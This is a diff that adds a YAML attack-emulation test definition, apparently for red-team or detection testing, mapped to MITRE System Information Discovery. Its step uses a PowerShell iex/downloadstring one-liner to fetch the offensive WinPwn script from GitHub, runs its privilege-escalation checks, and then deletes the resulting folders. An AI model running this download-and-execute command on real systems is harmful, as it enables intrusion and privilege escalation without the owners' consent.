@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: WinPwn - Powersploits privesc checks
+description: Powersploits privesc checks using oldchecks function of WinPwn
+uuid: 345cb8e4-d2de-4011-a580-619cf5a9e2d7
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1082: System Information Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powersploits-privesc-checks
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        oldchecks -noninteractive -consoleoutput
+      executor: powershell
+      cleanup:
+        inline: |-
+            rm -force -recurse .\DomainRecon -ErrorAction Ignore
+            rm -force -recurse .\Exploitation -ErrorAction Ignore
+            rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
+            rm -force -recurse .\LocalRecon -ErrorAction Ignore
+            rm -force -recurse .\Vulnerabilities -ErrorAction Ignore
+        executor: powershell
